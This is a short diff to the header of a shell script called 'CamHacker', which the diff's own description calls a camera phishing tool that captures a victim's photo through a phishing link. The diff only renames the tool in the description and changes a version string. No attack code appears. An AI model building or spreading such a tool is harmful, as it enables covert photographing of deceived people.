@@ -2,7 +2,7 @@
 
 # CamHacker
 # Version    : 1.5
-# Description: CamLuden is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : kasroudrakr
 # Github     : https://github.com/kasroudrakr
 # Email      : kasroudrakrd@gmail.com
@@ -57,7 +57,7 @@ success="${cyan}[${white}√${cyan}] ${green}"
 
 
 
-version="Special edition Luden"
+version="1.5"
 
 cwd=`pwd`
 tunneler_dir="$HOME/.tunneler"
